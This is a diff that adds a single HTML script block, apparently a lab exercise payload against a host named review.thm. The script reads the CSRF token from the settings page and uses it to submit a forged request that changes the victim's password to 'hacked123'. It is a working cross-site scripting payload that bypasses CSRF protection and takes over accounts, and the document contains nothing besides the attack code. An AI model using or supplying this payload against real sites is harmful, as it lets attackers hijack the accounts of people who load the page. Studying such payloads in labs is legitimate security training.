@@ -1,0 +1,17 @@
+<script>
+ var req = new XMLHttpRequest();
+ req.onload = handleResponse;
+ req.open('get','http://review.thm/settings.php', false);
+ req.send();
+ function handleResponse() {
+    var tokena = this.responseText.match(/name="csrf_token" value="(\w+)"/)[1];
+
+    var formData = new FormData();
+    formData.append('new_password', 'hacked123');
+    formData.append('csrf_token', tokena);
+
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', 'http://review.thm/update_password.php', false);
+    changeReq.send(formData);
+ };
+</script>
